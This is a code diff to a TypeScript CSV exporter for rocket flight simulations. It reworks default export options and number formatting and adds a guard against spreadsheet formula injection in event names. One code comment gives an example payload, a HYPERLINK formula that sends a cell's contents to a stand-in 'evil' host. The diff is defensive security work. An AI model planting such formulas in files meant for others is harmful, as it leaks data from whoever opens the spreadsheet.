@@ -1,13 +1,15 @@
 import type { FlightResult, AeroSweep } from '../../engine/openRocketEngine';
 import {
   branchSeries,
-  DEFAULT_CSV_COLUMNS,
+  defaultCsvFormat,
   flightColumns,
   usableColumns,
   type FlightColumn,
 } from '../flight/flightColumns';
 import type { EventRow } from '../flight/flightEvents';
 import { siToUiDelta, type Quantity, type UnitSelection } from '../../prefs/units';
+import { plainDecimal } from '../files/numberText';
+import { neutralizeFormula } from './csvCell';
 
 /**
  * CSV exporters for the flight time-series and the drag sweep. Columns are
@@ -22,7 +24,7 @@ const EOL = '\r\n';
 
 const cell = (v: number | null | undefined, digits?: number): string => {
   if (v == null || !Number.isFinite(v)) return '';
-  return digits == null ? String(Math.round(v * 1e6) / 1e6) : v.toFixed(digits);
+  return digits == null ? plainDecimal(v, 6) : v.toFixed(digits);
 };
 const mul = (v: number | null | undefined, f: number): number | null =>
   v == null || !Number.isFinite(v) ? null : v * f;
@@ -74,14 +76,7 @@ export interface FlightCsvOptions {
 }
 
 const DEFAULT_CSV_OPTIONS: FlightCsvOptions = {
-  columns: [...DEFAULT_CSV_COLUMNS],
-  separator: ',',
-  decimals: 3,
-  exponential: false,
-  simDescription: true,
-  fieldDescriptions: true,
-  flightEvents: true,
-  commentChar: '#',
+  ...defaultCsvFormat(),
   branchIndex: 0,
   columnName: (c) => c.key,
 };
@@ -237,8 +232,21 @@ export function flightEventsCsv(
   // Names come from the design and from a translation, so they can hold a comma
   // or a newline; neither may split the row. Quoting rather than stripping,
   // because unlike a column header these are the user's own words.
-  const text = (v: string | undefined): string =>
-    v == null || v === '' ? '' : `"${v.replace(/[\r\n]+/g, ' ').replace(/"/g, '""')}"`;
+  // Quoting alone does NOT stop spreadsheet formula injection: Excel and Sheets
+  // strip the quoting before evaluating, so a recovery device named
+  // `=HYPERLINK("http://evil/?"&A1,"Open")` in a shared .ork executes when the
+  // exported events CSV is opened. Prefix a `'` on a leading trigger, as
+  // reportCsv's `cell` does.
+  //
+  // Strict on a leading `-`, unlike flightPathExport's escaper: every value
+  // here is a NAME, so there is no negative number to keep numeric, and
+  // `-1+HYPERLINK(...)` does evaluate.
+  const text = (v: string | undefined): string => {
+    if (v == null || v === '') return '';
+    const flat = v.replace(/[\r\n]+/g, ' ');
+    const safe = neutralizeFormula(flat);
+    return `"${safe.replace(/"/g, '""')}"`;
+  };
 
   const lines: string[] = [];
   if (name) lines.push(`# Simulation: ${name.replace(/[\r\n]+/g, ' ')}`);
